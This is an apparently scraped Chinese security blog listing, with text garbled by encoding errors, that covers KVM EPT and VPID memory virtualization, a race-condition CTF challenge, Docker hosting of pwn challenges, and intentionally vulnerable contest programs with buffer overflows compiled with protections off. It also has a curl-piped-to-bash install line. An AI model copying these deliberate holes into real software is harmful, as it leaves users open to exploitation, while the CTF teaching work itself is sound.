â€‹		å…·ä½“è€Œè¨€ï¼šå½“Guestå†…éƒ¨å‘ç”Ÿç¼ºé¡µå¼‚å¸¸æ—¶ï¼ŒCPUä¸å†åˆ‡æ¢åˆ°Hostæ¨¡å¼äº†ï¼Œè€Œæ˜¯ç”±Guestè‡ªèº«çš„ç¼ºé¡µå¼‚å¸¸å¤„ç†å‡½æ•°å¤„ç†ã€‚å½“åœ°å€ä»GVAç¿»è¯‘åˆ°GPAåï¼ŒGPAåœ¨ç¡¬ä»¶å†…éƒ¨ä»MMUæµè½¬åˆ°äº†EPTã€‚å¦‚æœEPTé¡µè¡¨ä¸­å­˜åœ¨GPAåˆ°HPAçš„æ˜ å°„ï¼Œåˆ™EPAæœ€ç»ˆè·å–äº†GPAå¯¹åº”çš„HPAï¼Œå°†HPAé€ä¸Šåœ°å€æ€»çº¿ã€‚å¦‚æœEPTä¸­å°šæœªå»ºç«‹GPAåˆ°HPAçš„æ˜ å°„ï¼Œåˆ™CPUæŠ›å‡ºEPTå¼‚å¸¸ï¼ŒCPUä»Guestæ¨¡å¼åˆ‡æ¢åˆ°Hostæ¨¡å¼ï¼ŒKVMä¸­çš„EPTå¼‚å¸¸å¤„ç†å‡½æ•°è´Ÿè´£å¯»æ‰¾ç©ºé—²ç‰©ç†é¡µé¢ï¼Œå»ºç«‹EPTè¡¨ä¸­GPAåˆ°HPAçš„æ˜ å°„ã€‚
â€‹		VMXåœ¨VMCSä¸­å®šä¹‰äº†ä¸€ä¸ªå­—æ®µ Extended-Page-Table Pointerï¼ŒKVMå¯ä»¥å°†EPTé¡µè¡¨çš„ä½ç½®å†™å…¥è¿™ä¸ªå­—æ®µï¼Œè¿™æ ·å½“CPUè¿›å…¥Guestæ¨¡å¼æ—¶ï¼Œå°±å¯ä»¥ä»è¿™ä¸ªå­—æ®µè¯»å–EPTé¡µè¡¨çš„ä½ç½®ã€‚
EPTé¡µè¡¨çš„è®¾ç½®vmx.c
1234567891011121314151617181920212223242526272829static void vmx_load_mmu_pgd(struct kvm_vcpu *vcpu, hpa_t root_hpa,			     int root_level)&#123;	struct kvm *kvm = vcpu-&gt;kvm;	bool update_guest_cr3 = true;	unsigned long guest_cr3;	u64 eptp;	if (enable_ept) &#123;		eptp = construct_eptp(vcpu, root_hpa, root_level);		vmcs_write64(EPT_POINTER, eptp);		hv_track_root_tdp(vcpu, root_hpa);		if (!enable_unrestricted_guest &amp;&amp; !is_paging(vcpu))			guest_cr3 = to_kvm_vmx(kvm)-&gt;ept_identity_map_addr;		else if (kvm_register_is_dirty(vcpu, VCPU_EXREG_CR3))			guest_cr3 = vcpu-&gt;arch.cr3;		else /* vmcs.GUEST_CR3 is already up-to-date. */			update_guest_cr3 = false;		vmx_ept_load_pdptrs(vcpu);	&#125; else &#123;		guest_cr3 = root_hpa | kvm_get_active_pcid(vcpu);	&#125;	if (update_guest_cr3)		vmcs_writel(GUEST_CR3, guest_cr3);&#125;

â€‹		é€šè¿‡construct_eptpæ„å»ºeptï¼Œç„¶åvmcs_write64å†™å…¥vmcsï¼Œè¿™é‡Œæ˜¯å°†root_hpaä½œä¸ºäº†EPTçš„æ ¹é¡µé¢ï¼Œç¬¬18è¡Œï¼Œè®¾ç½®å˜é‡guest_cr3æŒ‡å‘guestè‡ªå·±çš„é¡µè¡¨ï¼Œæœ€å27è¡Œï¼ŒæŠŠcr3çš„å€¼å†™å…¥VMCSå­—æ®µï¼Œè¿™æ ·åˆ‡å…¥gueståï¼Œguestæ¨¡å¼ä¸‹çš„CPUçš„cr3å¯„å­˜å™¨å°±æŒ‡å‘äº†è‡ªå·±çš„é¡µè¡¨ã€‚
â€‹		
EPTé¡µè¡¨çš„æ„å»º &#x2F; ç¼ºé¡µå¼‚å¸¸å¤„ç† ï¼ˆGPA-HPAï¼‰â€‹		CPUéœ€è¦æŸ¥è¯¢EPTè¡¨æ¥è¿›è¡ŒGPA-HPAçš„è½¬æ¢ï¼Œåˆå§‹æƒ…å†µä¸‹ï¼Œguest cr3æŒ‡å‘çš„åœ°å€çš„é¡µè¡¨é¡¹éƒ½æ˜¯ç©ºçš„ï¼ŒCPUè§¦å‘EPT violation ï¼Œè™šæ‹Ÿæœºäº§ç”Ÿé€€å‡ºï¼Œå¹¶ä¸”é€€å‡ºåŸå› ä¸ºEXIT_REASON_EPT_VIOLATIONï¼Œä¼šè°ƒç”¨handle_ept_violationå¤„ç†å‡½æ•°




â€‹		vmx.c
1234567891011121314151617static int handle_ept_violation(struct kvm_vcpu *vcpu)&#123;	unsigned long exit_qualification;	gpa_t gpa;	u64 error_code;	exit_qualification = vmx_get_exit_qual(vcpu);	if (!(to_vmx(vcpu)-&gt;idt_vectoring_info &amp; VECTORING_INFO_VALID_MASK) &amp;&amp;			enable_vnmi &amp;&amp;			(exit_qualification &amp; INTR_INFO_UNBLOCK_NMI))		vmcs_set_bits(GUEST_INTERRUPTIBILITY_INFO, GUEST_INTR_STATE_NMI);	gpa = vmcs_read64(GUEST_PHYSICAL_ADDRESS);// vm exitå‰ä¼šå°†å¼•å‘å¼‚å¸¸çš„GPAä¿å­˜åˆ°VMCSçš„è¯¥å­—æ®µï¼Œè¿™é‡Œè¿›è¡Œè¯»å–.......	return kvm_mmu_page_fault(vcpu, gpa, error_code, NULL, 0);&#125;

â€‹		ç»è¿‡ä¸€ç³»åˆ—æ£€æŸ¥å’Œè®¾ç½®åè¿›å…¥kvm_mmu_page_faultå¤„ç†å‡½æ•°ï¼Œè¿™é‡Œå°±æ£€æŸ¥äº†mmioè¿™ç§é”™è¯¯ï¼Œå¦‚æœä¸æ˜¯çš„è¯ï¼Œä¼šè¿›å…¥ä¸‹ä¸€ä¸ªå¤„ç†å‡½æ•°kvm_mmu_do_page_fault
1234567891011121314151617181920int noinline kvm_mmu_page_fault(struct kvm_vcpu *vcpu, gpa_t cr2_or_gpa, u64 error_code,		       void *insn, int insn_len)&#123;....	r = RET_PF_INVALID;	if (unlikely(error_code &amp; PFERR_RSVD_MASK)) &#123;		r = handle_mmio_page_fault(vcpu, cr2_or_gpa, direct);		if (r == RET_PF_EMULATE)			goto emulate;	&#125;	if (r == RET_PF_INVALID) &#123;		r = kvm_mmu_do_page_fault(vcpu, cr2_or_gpa,					  lower_32_bits(error_code), false,					  &amp;emulation_type);.....&#125;EXPORT_SYMBOL_GPL(kvm_mmu_page_fault);

â€‹		kvm_mmu_do_page_fault
mmu_internal.h   è¿™é‡Œä¼šè¿›å…¥kvm_tdp_page_fault(ä¸Šé¢çš„å½±å­é¡µè¡¨å°±è¿›å…¥elseäº†)
12345678910111213static inline int kvm_mmu_do_page_fault(struct kvm_vcpu *vcpu, gpa_t cr2_or_gpa,					u32 err, bool prefetch, int *emulation_type)&#123;......	if (IS_ENABLED(CONFIG_RETPOLINE) &amp;&amp; fault.is_tdp)		r = kvm_tdp_page_fault(vcpu, &amp;fault);	else		r = vcpu-&gt;arch.mmu-&gt;page_fault(vcpu, &amp;fault);.....&#125;

â€‹		kvm_tdp_page_fault, ç›®å‰è¿˜ä¸æ˜¯å¾ˆäº†è§£tdpï¼Œä½†èµ°è¿™ä¸¤æ¡è·¯éƒ½èƒ½åˆ°æœ€åçš„åœ°å€æ˜ å°„
12345678910int kvm_tdp_page_fault(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault)&#123;.....#ifdef CONFIG_X86_64	if (tdp_mmu_enabled)		return kvm_tdp_mmu_page_fault(vcpu, fault);#endif	return direct_page_fault(vcpu, fault);&#125;

â€‹		kvm_tdp_mmu_page_faultä¸­çš„kvm_faultin_pfnæ˜¯GPAåˆ°HPAçš„é‡è¦å‡½æ•°
1234567static int kvm_tdp_mmu_page_fault(struct kvm_vcpu *vcpu,				  struct kvm_page_fault *fault)&#123;..	r = kvm_faultin_pfn(vcpu, fault, ACC_ALL);	...&#125;

â€‹		direct_page_faultçš„æœ€åä¼šèµ°åˆ°direct_mapå‡½æ•°ï¼Œdirect_mapæ˜¯EPTé¡µè¡¨æ„å»ºè¿‡ç¨‹ä¸­çš„å…³é”®å‡½æ•°, å»ºç«‹æ˜ å°„ï¼Œæ„Ÿè§‰ä¸€äº›ä¸»ä½“é€»è¾‘å’Œ FNAME(fetch)æœ‰ç‚¹åƒ
ä¸‰ã€TLBç¼“å­˜â€‹		EPTï¼šCPUä½¿ç”¨TLBï¼ˆTranslation Lookaside Bufferï¼‰ç¼“å­˜çº¿æ€§è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„ï¼Œåœ°å€è½¬æ¢æ—¶CPUå…ˆæ ¹æ®GPAå…ˆæŸ¥æ‰¾TLBï¼Œå¦‚æœæœªæ‰¾åˆ°æ˜ å°„çš„HPAï¼Œå°†æ ¹æ®é¡µè¡¨ä¸­çš„æ˜ å°„å¡«å……TLBï¼Œå†è¿›è¡Œåœ°å€è½¬æ¢ã€‚
â€‹		å½±å­é¡µè¡¨æ–¹æ¡ˆï¼šä¸åŒGuestçš„vCPUåˆ‡æ¢æ‰§è¡Œæ—¶éœ€è¦åˆ·æ–°TLBï¼Œä¸¥é‡å½±å“äº†å†…å­˜è®¿é—®æ•ˆç‡ã€‚å› æ­¤ï¼ŒIntelå¼•å…¥äº†VPIDï¼ˆVirtual-Processor Identifierï¼‰æŠ€æœ¯åœ¨ç¡¬ä»¶ä¸Šä¸ºTLBå¢åŠ ä¸€ä¸ªæ ‡å¿—ï¼Œæ¯ä¸ªTLBè¡¨é¡¹ä¸ä¸€ä¸ªVPIDå…³è”ï¼Œå”¯ä¸€å¯¹åº”ä¸€ä¸ªvCPUï¼Œå½“vCPUåˆ‡æ¢æ—¶å¯æ ¹æ®VPIDæ‰¾åˆ°å¹¶ä¿ç•™å·²æœ‰çš„TLBè¡¨é¡¹ï¼Œå‡å°‘TLBåˆ·æ–°ã€‚
VPIDâ€‹		VPIDæ˜¯ä¸€ç§ç¡¬ä»¶çº§çš„å¯¹TLBèµ„æºç®¡ç†çš„ä¼˜åŒ–ã€‚é€šè¿‡åœ¨ç¡¬ä»¶ä¸Šä¸ºæ¯ä¸ªTLBé¡¹å¢åŠ ä¸€ä¸ªæ ‡å¿—ï¼Œæ¥æ ‡è¯†ä¸åŒçš„è™šæ‹Ÿå¤„ç†å™¨åœ°å€ç©ºé—´ï¼Œä»è€ŒåŒºåˆ†å¼€VMMä»¥åŠä¸åŒè™šæ‹Ÿæœºçš„ä¸åŒå¤„ç†å™¨çš„TLBã€‚é¿å…äº†æ¯æ¬¡åˆ‡æ¢éƒ½ä½¿å¾—TLBå…¨éƒ¨å¤±æ•ˆã€‚
â€‹		VT-x é€šè¿‡åœ¨VMCSä¸­å¢åŠ ä¸¤ä¸ªåŸŸæ¥æ”¯æŒVPIDï¼Œä¸€ä¸ªæ˜¯VMCSä¸­çš„enable VPIDåŸŸï¼Œè¯¥åŸŸå†³å®šæ˜¯å¦å¼€å¯VPIDåŠŸèƒ½ã€‚ç¬¬äºŒä¸ªæ˜¯VPIDåŸŸï¼Œç”¨äºæ ‡è¯†VMCSå¯¹åº”çš„TLBã€‚VMMæœ¬èº«ä¹Ÿéœ€è¦ä¸€ä¸ªVPIDï¼ŒVT-xè§„å®šè™šæ‹Ÿå¤„ç†å™¨æ ‡å¿—0è¢«æŒ‡å®šç”¨äºVMMè‡ªèº«ã€‚
capabilities.hä¸­æœ‰ä¸€ä¸ªå…³äºå†…å­˜ä¸¤å¤§ç‰¹æ€§çš„ç»“æ„ä½“
1234struct vmx_capability &#123;	u32 ept;	u32 vpid;&#125;;

â€‹		ä¼šåœ¨hardware_setupå‡½æ•°ä¸­è®¾ç½®ç›¸å…³ç‰¹æ€§æ˜¯å¦å¼€å¯
12345static __init int hardware_setup(void)&#123;    	if (!cpu_has_vmx_vpid() || !cpu_has_vmx_invvpid() ||	    !(cpu_has_vmx_invvpid_single() || cpu_has_vmx_invvpid_global()))		enable_vpid = 0;

â€‹		å‰©ä¸‹çš„äº‹å¥½åƒå°±æ²¡è½¯ä»¶ä»€ä¹ˆäº‹äº†ï¼Œå½’ç¡¬ä»¶å»æ“ä½œ
å››ã€å‚è€ƒhttps://www.cnblogs.com/LoyenWang/p/13943005.html ä¸è¿‡è¿™ä¸ªæ˜¯armçš„
https://mp.weixin.qq.com/s/fLSSbtPjx29Gg-IJfgnbZw
https://zhuanlan.zhihu.com/p/108425561  TLBåŸç†
http://www.xiongfuli.com/%E8%99%9A%E6%8B%9F%E5%8C%96/2013-06/KVM-Implementation.html
https://luohao-brian.gitbooks.io/interrupt-virtualization/content/kvmzhi-nei-cun-xu-ni531628-kvm-mmu-virtualization.html
https://cloud.tencent.com/developer/article/1975756 
https://royhunter.github.io/2014/06/18/KVM-EPT/
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-40-racecondition%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/" title="pwnå…¥é—¨-40-raceconditionæ¡ä»¶ç«äº‰æ¼æ´åˆæ¢">pwnå…¥é—¨-40-raceconditionæ¡ä»¶ç«äº‰æ¼æ´åˆæ¢</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-09-16T06:22:49.000Z" title="å‘è¡¨äº 2023-09-16 14:22:49">2023-09-16</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-11-16T13:00:05.998Z" title="æ›´æ–°äº 2023-11-16 21:00:05">2023-11-16</time></span></div><div class="content">â€‹		è¿™ä¸ªé¢˜ç›®æ­å»ºç¯å¢ƒä¸çŸ¥é“æ€ä¹ˆæ­å»ºâ€¦æ§åˆ¶ä¸å¥½æƒé™ç›´æ¥å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤æ‹¿flagäº†..
æ”¹ä¸€ä¸‹å‡½æ•°, systemå’Œ&#x2F;bin&#x2F;sh æˆ–è€…ç»™å‡ºlibcåœ°å€?  gift
gcc -o race main.c -fno-stack-protector  -no-pieéœ€è¦å…³é—­canaryå’Œpie
https://bbs.huaweicloud.com/blogs/399812
ä¸ºå•¥å‡ºé”™å‘¢ï¼Œ core dumpedçœ‹ä¸€ä¸‹å§
https://blog.csdn.net/qq_43714097/article/details/130734858
https://stackoverflow.com/questions/32892908/c-system-raises-enomem
https://airman604.medium.com/protostar-stack7-walkthrough-2aa2428be3e0

https://blog.csdn.net/weixin_44411509/article/details/109860791
https://blog.csdn.net/chichoxian/article/details/53486131
ä¸»è¦å°±æ˜¯è¿™é‡Œè¯´çš„é—®é¢˜
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;//void showflag() &#123; system(&quot;cat flag&quot;); &#125;  char *argv[]=&#123;&quot;cat&quot;,&quot;./flag&quot;, NULL&#125;; char *envp[]=&#123;0,NULL&#125;;void showflag() &#123; execve(&quot;/bin/cat&quot;,argv,envp); &#125;void vuln(char *file, char *buf) &#123;  int number;  int index = 0;  int fd = open(file, O_RDONLY);  if (fd == -1) &#123;    perror(&quot;open file failed!!&quot;);    return;  &#125;  while (1) &#123;    number = read(fd, buf + index, 128);    if (number &lt;= 0) &#123;      break;    &#125;    index += number;  &#125;  buf[index + 1] = &#x27;\x00&#x27;;&#125;void check(char *file) &#123;  struct stat tmp;  if (strcmp(file, &quot;flag&quot;) == 0) &#123;    puts(&quot;file can not be flag!!&quot;);    exit(0);  &#125;  stat(file, &amp;tmp);  if (tmp.st_size &gt; 255) &#123;    puts(&quot;file size is too large!!&quot;);    exit(0);  &#125;&#125;int main(int argc, char *argv[argc]) &#123;  char buf[256];  if (argc == 2) &#123;    check(argv[1]);    vuln(argv[1], buf);  &#125; else &#123;    puts(&quot;Usage ./prog &lt;filename&gt;&quot;);  &#125;  return 0;&#125;





å›å¤´æ•´ç†ä¸€ä¸‹æ­å»ºé¢˜ç›®ç¯å¢ƒã€‚ã€‚ã€‚
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-39-docker%E5%85%A5%E9%97%A8%E5%8F%8Apwn%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="pwnå…¥é—¨-39-dockerå…¥é—¨åŠpwnå‡ºé¢˜ç¯å¢ƒæ­å»º">pwnå…¥é—¨-39-dockerå…¥é—¨åŠpwnå‡ºé¢˜ç¯å¢ƒæ­å»º</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-09-16T05:30:16.000Z" title="å‘è¡¨äº 2023-09-16 13:30:16">2023-09-16</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-09-28T16:25:48.134Z" title="æ›´æ–°äº 2023-09-29 00:25:48">2023-09-29</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/PWN/%E8%99%9A%E6%8B%9F%E5%8C%96/">è™šæ‹ŸåŒ–</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a><span class="article-meta-link">â€¢</span><a class="article-meta__tags" href="/tags/docker/">docker</a></span></div><div class="content">dockerå…¥é—¨å‚è€ƒèµ„æ–™:https://www.runoob.com/docker
https://yeasy.gitbook.io/docker_practice/
ä¸€ã€å®‰è£…ä½¿ç”¨å®˜æ–¹è„šæœ¬å®‰è£…docker
curl -fsSL https://get.docker.com | bash -s docker â€“mirror Aliyun
æ‰‹åŠ¨å®‰è£…(ä¸å¦‚è„šæœ¬ç¨³å®šå°‘å‡ºé”™)
å¼€å¯docker 
systemctl enable docker 
systemctl start docker
æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ: docker run â€“rm hello-world
hello-worldæ˜¯æµ‹è¯•å®¹å™¨, â€“rmè¡¨ç¤ºé€€å‡ºå®¹å™¨å,è‡ªåŠ¨åˆ é™¤å®¹å™¨
äºŒã€ä½¿ç”¨å…¥é—¨1.é•œåƒ
docker images æŸ¥çœ‹æœ¬åœ°é•œåƒ

docker pull xxxx æ‹‰å»é•œåƒ, ä¾‹å¦‚docker pull ubuntu:18.04


â€‹		ä¸ç»™é•œåƒä»“åº“åœ°å€çš„è¯, ä¼šä» Docker Hub ï¼ˆdocker.ioï¼‰è·å–é•œåƒ, è€Œé•œåƒåç§°æ˜¯ ubuntu:18.04ï¼Œå› æ­¤å°†ä¼šè·å–å®˜æ–¹é•œåƒ library/ubuntu ä»“åº“ä¸­æ ‡ç­¾ä¸º 18.04 çš„é•œåƒã€‚docker pullå‘½ä»¤çš„è¾“å‡ºç»“æœæœ€åä¸€è¡Œç»™å‡ºäº†é•œåƒçš„å®Œæ•´åç§°ï¼Œä¾‹å¦‚ï¼š docker.io/library/ubuntu:18.04ã€‚

docker rmi xxxx  åˆ é™¤é•œåƒ

docker build -t xxxx .  ç”¨dockerfileæ„å»ºé•œåƒ


2.å®¹å™¨
docker ps æŸ¥çœ‹å®¹å™¨ -aæŸ¥çœ‹æ‰€æœ‰(åŒ…æ‹¬åœæ­¢çš„)

docker run -it ubuntu:18.04 bash


â€‹	-it: -i äº¤äº’å¼æ“ä½œ -t ç»ˆç«¯ 
â€‹	bash å‘½ä»¤,å¸Œæœ›æœ‰äº¤äº’å¼shell,æ‰€ä»¥ç”¨è¿™ä¸ª,æˆ–è€…&#x2F;bin&#x2F;shä¹‹ç±»çš„

docker stop xxx  åœæ­¢å®¹å™¨

CTF-pwnå‡ºé¢˜ç¯å¢ƒæ­å»ºâ€‹		pwnå‡ºé¢˜ä¸»è¦ç”¨åˆ°äº† https://github.com/Eadom/ctf_xinetd
ç¯å¢ƒæ­å»º
https://blog.csdn.net/weixin_53757397/article/details/128489015
https://blog.csdn.net/mylyylmy/article/details/79917776
https://nocbtm.github.io/2019/09/25/pwné¢˜çš„æ­å»º/
https://blog.csdn.net/weixin_53757397/article/details/128489015 æ„Ÿè§‰æœ‰ç‚¹å•°å—¦,ä¸ä¸€å®šéœ€è¦ä¸Šä¼ dockerä»“åº“
https://blog.csdn.net/weixin_46521144/article/details/120572274 æ’é”™
æ­å»ºæ­¥éª¤git clone https://github.com/Eadom/ctf_xinetd.git

å°†ç¼–è¯‘å¥½çš„libcã€flagã€é¢˜ç›®æ–‡ä»¶æ‹·è´åˆ°binç›®å½•ä¸‹

â€‹		å¦‚æœéœ€è¦ç‰¹å®šçš„libc
â€‹		æå‰patchelfå¥½,æŠŠlibcæ–‡ä»¶é¡µæ‹·è´åˆ°ctf_xinetdçš„binç›®å½•ä¸‹
â€‹		patchelf â€“set-interpreter .&#x2F;2.31-0ubuntu9_amd64&#x2F;ld-linux-x86-64.so.2 .&#x2F;timuâ€‹		patchelf â€“set-rpath .&#x2F;2.31-0ubuntu9_amd64&#x2F; .&#x2F;timu
â€‹		ç”¨ç»å¯¹è·¯å¾„ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸è¡Œ????

åˆ›å»ºdocker-compose.ymlæ–‡ä»¶,è¿™é‡Œçš„3389æ”¹æˆé¢˜ç›®è¦æ˜ å°„çš„ç«¯å£(ç‰©ç†æœºçš„),9999æ˜¯dockeré‡Œé¢çš„ç«¯å£,imageåå­—è¦å’Œåé¢åˆ›å»ºçš„docker imagesåå­—ä¸€æ ·

123456789101112version: &#x27;3&#x27;services:    pwn:        build: ./        image: pwn1 #è¿™é‡Œä¿®æ”¹çš„æ˜¯imageså,å°†å’Œ docker build -t &quot;pwn1&quot; . è¯¥å‘½ä»¤æœ‰å…³        ports:            - &quot;3389:9999&quot;        pids_limit: 1024        # cpus: 0.5        restart: unless-stopped        # privileged: true

Dockerfile
1234FROM ubuntu:22.04 æ ¹æ®æƒ…å†µä¿®æ”¹ç‰ˆæœ¬  RUN cp -R /lib* /home/ctf &amp;&amp;\  ç‰ˆæœ¬é«˜äº18.04è¦åˆ é™¤è¿™ä¸€å¥??ä¸ºå•¥å‘¢??  	cp -R /usr/lib* /home/ctf 



ctf.xinetd
1234567891011121314151617181920service ctf&#123;    disable = no    socket_type = stream    protocol    = tcp    wait        = no    user        = root    type        = UNLISTED    port        = 9999    bind        = 0.0.0.0    server      = /usr/sbin/chroot    # replace helloworld to your program    server_args = --userspec=1000:1000 /home/ctf ./timu   è¿™é‡Œtimuæ˜¯é¢˜ç›®binæ–‡ä»¶å    banner_fail = /etc/banner_fail    # safety options    per_source	= 10 # the maximum instances of this service per source IP address    rlimit_cpu	= 20 # the maximum number of CPU seconds that the service may use    #rlimit_as  = 1024M # the Address Space resource limit for the service    #access_times = 2:00-9:00 12:00-24:00&#125;




åˆ¶ä½œé•œåƒ

â€‹		å»ºç«‹å®¹å™¨,pwn1åå­—å°±æ˜¯é•œåƒçš„åå­—
1docker build -t &quot;pwn1&quot; .



4.åˆ›å»ºè¿è¡Œå®¹å™¨
â€‹		docker run -d -p 0.0.0.0:3389:9999 pwn1 è¿è¡Œå®¹å™¨,è¿™é‡Œå°±éƒ¨ç½²å¥½äº†,å¯ä»¥è¿›è¡Œæ‰“äº†,3389æ˜¯æš´éœ²å‡ºæ¥çš„ç«¯å£
â€‹		docker exec -it 16a224caf905 &#x2F;bin&#x2F;bash  å’Œå®¹å™¨è¿›è¡Œäº¤äº’,(è¿™ä¸ªæ˜¯é€€å‡ºåå†æ¬¡è¿›å…¥,å’Œrunæ—¶å€™-itä¸ä¸€æ ·)
æ–‡ä»¶æ‹·è´ https://blog.csdn.net/sunhuaqiang1/article/details/88354410
docker cp &#x2F;root&#x2F;chuti&#x2F;uaf&#x2F;timu pwncp:&#x2F;home&#x2F;ctf&#x2F;timu
https://blog.csdn.net/yue7603835/article/details/122456650
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/" title="pwnå…¥é—¨-38-æœˆèµ›å‡ºé¢˜3é“">pwnå…¥é—¨-38-æœˆèµ›å‡ºé¢˜3é“</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-09-16T05:23:18.000Z" title="å‘è¡¨äº 2023-09-16 13:23:18">2023-09-16</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-11-16T09:27:03.138Z" title="æ›´æ–°äº 2023-11-16 17:27:03">2023-11-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a></span></div><div class="content">â€‹		ä¾‹è¡Œæœˆèµ›å‡ºé¢˜ï¼Œå‡ºäº†ä¸‰é“ï¼Œä¸¤é“æ˜¯åŸºäºè‡ªå·±åšè¿‡çš„é¢˜ï¼Œèåˆäº†å…¶ä»–çŸ¥è¯†ç‚¹ï¼ˆç¼ç¼è¡¥è¡¥åˆä¸€å¹´ï¼‰ï¼Œè¿˜æœ‰ä¸€é“æ˜¯ä¸´æ—¶å‡ºçš„å‡‘æ•°çš„ã€‚æ„Ÿè§‰ç¡®å®ä¸ä»…éœ€è¦åšé¢˜ï¼Œä¹Ÿéœ€è¦å‡ºé¢˜ï¼Œå‡ºé¢˜çš„æ—¶å€™æ‰èƒ½æ›´å¥½åœ°ç†è§£å‡ºé¢˜äººçš„æƒ³æ³•ï¼ˆåºŸè¯ã€‚ã€‚ï¼‰ï¼Œä»¥åŠæ³¨æ„åˆ°ä¹‹å‰çš„å¾ˆå¤šç»†èŠ‚ã€‚
â€‹		è¿™æ¬¡ä¹Ÿè¸©å‘è¸©äº†å¾ˆå¤šï¼Œæ¯”å¦‚æ¡ä»¶ç«äº‰çš„é¢˜ç›®ï¼Œä¸çŸ¥é“æ€ä¹ˆéƒ¨ç½²ã€‚ã€‚ã€‚æƒ³äº†å¾ˆå¤šæ–¹æ¡ˆéƒ½ä¸è¡Œã€‚ä»¥åŠdockerå®¹å™¨è‡ªèº«çš„é—®é¢˜ï¼Œå®ƒåªæ˜¯éš”ç¦»äº†è¿›ç¨‹ï¼Œå¹¶æ²¡æœ‰ç”¨æ–°çš„å†…æ ¸ï¼Œæ‰€ä»¥ä¸€äº›å†…æ ¸ç‰¹æ€§ç”¨ä¸äº†ã€‚
ret2regé¢˜ç›®æºç 123456789101112131415161718192021#include &lt;stdio.h&gt;    #include &lt;string.h&gt;    void evilfunction(char *input) &#123;        char buffer[512];        strcpy(buffer, input);    &#125;    int main(int argc, char **argv) &#123;        char input[580];    printf(&quot;welcome to here,please give me something&quot;);    gets(input);    evilfunction(input);    return 0;    &#125; 





åˆ†æâ€‹		æœ¬èº«è¿™é“é¢˜çš„åŸé¢˜æ˜¯æ²¡æœ‰å¼€å¯éšæœºåŒ–ï¼Œç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ç›´æ¥å†™shellcodeï¼Œç„¶åcall eaxè¿™ç§è¿‡å»æ‰§è¡Œshellcodeï¼Œä½†æ˜¯å¦‚æœå¼€äº†éšæœºåŒ–ï¼Œcall eaxçš„åœ°å€å°±ä¸ç¡®å®šäº†ï¼Œä½†æ˜¯å¯ä»¥è¿›è¡Œæšä¸¾ï¼Œï¼ˆä¹‹å‰ä¸€ç›´ä¸ä¼šå†™æšä¸¾çš„è„šæœ¬ï¼Œè¿™æ¬¡å­¦ä¼šäº†ã€‚ã€‚ã€‚ï¼‰æ„Ÿè§‰ä¹‹å‰æœ‰æ—¶å€™ä¹Ÿæ˜¯æˆåŠŸäº†,ä½†æ˜¯æ²¡æœ‰æ­£ç¡®åœæ­¢æˆ–æ‰“å°
â€‹		PIEå’ŒALSR:
ALSR:&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_spac  å®Œå…¨å¼€å¯æ—¶ æ ˆã€å †ã€libcå˜åŒ–,ç¨‹åºæœ¬èº«åŠPLTä¸å˜
PIE:å¯æ‰§è¡Œç¨‹åºçš„åŠ è½½åŸºå€
â€‹		åœ¨ä½œè€…é‚£ä¸ªå¹´ä»£,åº”è¯¥æ˜¯é»˜è®¤ä¸å¼€å¯PIEçš„,ç°åœ¨éƒ½æ˜¯é»˜è®¤å¼€å¯â€¦ ä¸å¼€å¯çš„è¯,å°±å¾ˆå®¹æ˜“äº†,alsrä¸å½±å“,æ‰€ä»¥åšçš„æ—¶å€™æœ‰ç‚¹æ€ªæ€ªçš„â€¦
gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector -no-pie

objdump -d ret2reg
804901d


å¼€å¯PIEâ€‹		è¿›è¡Œæšä¸¾, éšæœºåŒ–ç¨‹åº¦æ˜¯å¤šå°‘å‘¢??
